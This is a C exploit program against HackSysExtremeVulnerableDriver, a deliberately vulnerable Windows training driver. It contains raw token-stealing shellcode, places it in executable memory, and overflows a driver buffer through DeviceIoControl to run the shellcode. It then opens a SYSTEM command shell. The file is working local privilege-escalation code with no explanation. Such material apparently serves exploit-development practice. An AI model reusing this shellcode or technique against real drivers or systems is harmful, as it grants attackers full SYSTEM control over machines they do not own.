#include <stdio.h>
#include <windows.h>

#define STATUS_SUCCESS 0x0
#define IO_CODE 0x222027

int main(int argc, char* argv[]){
	char shellcode[] = "\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61\x31\xc0\x5d\xc2\x08\x00";

	printf("[+] Allocating memory region for shellcode\n");
	LPVOID Alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Alloc) {
		printf("[-] Error - Unable to allocate memory region for tokenstealing shellcode..");
		exit(1);
	}
	RtlMoveMemory(Alloc, shellcode, sizeof(shellcode));
	printf("[+] Successfully copied tokenstealing shellcode to memory region at: 0x%llx\n", Alloc);

	printf("[+] Calling CreateFileA() to obtain a handle to the driver..\n");
	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hDriver == INVALID_HANDLE_VALUE){
		printf("[-] Error - Unable to obtain a handle to the driver..\n");
		exit(1);
	}
	printf("[+] Successfully obtained a handle to the driver..\n");

	DWORD bytesRetn;
	CHAR expl[0x830];

	printf("[+] Adding terminator to the end of the payload..\n");
	memset(expl, 'A', 0x830);
	memcpy(&expl[0x828], &Alloc, 0x4);
	memcpy(&expl[0x82C], "\xB0\xB0\xD0\xBA", 0x4);

	printf("[+] Starting interaction with the driver..\n");
	DeviceIoControl(hDriver, IO_CODE, expl, 0xFFFFFFFF, NULL, 0, &bytesRetn, NULL);
	printf("[+] Welcome, NT AUTHORITY\\SYSTEM!\n\n");
	CloseHandle(hDriver);
	system("cmd.exe");

	return 0;
}
